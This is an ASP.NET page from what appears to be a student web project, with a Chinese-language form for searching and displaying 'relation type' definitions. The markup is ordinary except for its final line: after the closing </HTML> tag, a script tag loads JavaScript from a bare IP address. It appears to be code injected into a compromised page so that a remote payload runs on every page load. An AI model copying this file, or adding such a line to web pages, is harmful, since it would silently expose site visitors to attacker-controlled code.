<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rdefinitionsearch.aspx.vb" Inherits="relation.rdefinitionsearch"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rdefinitionsearch</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<form id="Form1" method="post"> <!--==========include pagehead==============-->
			<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table3" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A href="rmodelmodification.aspx">修改</A>
								</FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="topmenu3" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="宋体"></FONT>
			<TABLE id="Table4" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
									首页</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
							<SPAN class="p9"><A href="index.aspx">用户登录</A></SPAN> |<A href="newcustomer.aspx">注册</A>
						</FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="163" bgColor="#0859ad" height="20" style="WIDTH: 163px">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table5" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table6" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table7" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table1" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center">&nbsp;&nbsp;<A href="rmodelsearch.aspx">查询关系空间</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><A href="rdefinitionsearch.aspx">查询关系类型</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><A href="rinstancesearch.aspx">查询关系实例</A></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
		</form>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
			&nbsp;&nbsp;
			<TABLE id="Table11" style="WIDTH: 571px; HEIGHT: 546px" cellSpacing="1" cellPadding="1"
				width="571" border="1">
				<TR>
					<TD style="WIDTH: 262px; HEIGHT: 48px">
						<P><FONT face="宋体">
								<TABLE id="Table9" style="WIDTH: 242px; HEIGHT: 30px" cellSpacing="1" cellPadding="1" width="242"
									border="1">
									<TR>
										<TD style="WIDTH: 127px"><FONT face="宋体"><asp:label id="Label2" runat="server">关系类型搜索</asp:label></FONT></TD>
										<TD><asp:dropdownlist id="ddlstDefSearch" runat="server"></asp:dropdownlist></TD>
									</TR>
								</TABLE>
							</FONT>
						</P>
					</TD>
					<TD style="HEIGHT: 48px"><FONT face="宋体">
							<P><FONT face="宋体">
									<TABLE id="Table10" style="WIDTH: 235px; HEIGHT: 24px" cellSpacing="1" cellPadding="1"
										width="235" border="1">
										<TR>
											<TD>
												<P><FONT face="宋体"><asp:dropdownlist id="ddlstDefAtt" runat="server">
															<asp:ListItem Value="按关系类型编号">按关系类型编号</asp:ListItem>
															<asp:ListItem Value="按关系类型名称">按关系类型名称</asp:ListItem>
														</asp:dropdownlist></FONT></P>
											</TD>
											<TD><asp:button id="btnDefSearch" runat="server" Text="搜索" Width="54px"></asp:button></TD>
										</TR>
									</TABLE>
								</FONT>
							</P>
						</FONT>
					</TD>
				</TR>
				<TR>
					<TD style="WIDTH: 262px"><FONT face="宋体">
							<TABLE id="Table12" style="WIDTH: 245px; HEIGHT: 495px" cellSpacing="1" cellPadding="1"
								width="245" border="1">
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 7px"><asp:label id="Label17" runat="server">关系类型名称</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 29px"><asp:textbox id="txtDefName" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 32px"><asp:label id="Label15" runat="server">关系对象个数</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:textbox id="txtDefNum" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="宋体"><asp:label id="Label14" runat="server" Width="128px">是否有向关系</asp:label></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:radiobutton id="rbtnIsDirYes" runat="server" Text="有向" Width="88px" GroupName="rbtnIsDir"></asp:radiobutton><FONT face="宋体">&nbsp;
											<asp:radiobutton id="rbtnIsDirNo" runat="server" Text="无向" GroupName="rbtnIsDir"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px">用户权限</TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px"><asp:radiobutton id="rbtnAccPri1" runat="server" Text="权限1" GroupName="rbtnAccPri"></asp:radiobutton><asp:radiobutton id="rbtnAccPri2" runat="server" Text="权限2" GroupName="rbtnAccPri"></asp:radiobutton><asp:radiobutton id="rbtnAccPri3" runat="server" Text="权限3" GroupName="rbtnAccPri"></asp:radiobutton></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px; HEIGHT: 31px"><asp:label id="Label13" runat="server" Width="192px">是否需要关联对象的确认</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="宋体"><asp:radiobutton id="rbtnIsConfYes" runat="server" Text="需要确认" GroupName="rbtnIsConf"></asp:radiobutton>&nbsp;
											<asp:radiobutton id="rbtnIsConfNo" runat="server" Text="不需要确认" GroupName="rbtnIsConf"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label12" runat="server" Width="144px">关系类型发布时间</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><FONT face="宋体"><asp:textbox id="txtDefPubTime" runat="server"></asp:textbox></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label6" runat="server" Width="184px">关系类型的更新时间</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:textbox id="txtDefUpdateTime" runat="server"></asp:textbox></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label1" runat="server">关系空间有效性</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:radiobutton id="rbtnIsValidYes" runat="server" Text="有效" GroupName="rbtnIsValid"></asp:radiobutton><FONT face="宋体">&nbsp;
											<asp:radiobutton id="rbtnIsValidNo" runat="server" Text="无效" GroupName="rbtnIsValid"></asp:radiobutton></FONT></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label3" runat="server">关系类型的关联信息</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:datagrid id="dgrdDefAss" runat="server"></asp:datagrid></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:label id="Label4" runat="server">关系类型的逻辑关系</asp:label></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 229px"><asp:datagrid id="dgrdDefLogic" runat="server"></asp:datagrid></TD>
								</TR>
							</TABLE>
						</FONT>
					</TD>
					<TD><FONT face="宋体"><asp:image id="imgDef" runat="server" Width="202px" Height="202px"></asp:image></FONT></TD>
				</TR>
			</TABLE>
		</FORM>
		<FORM id="Form2" method="post">
			<FONT face="宋体">
				<asp:label id="lblWarning" runat="server" Width="408px" ForeColor="#0000C0">label</asp:label></FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table8" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 陆美丽 王海玲 </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
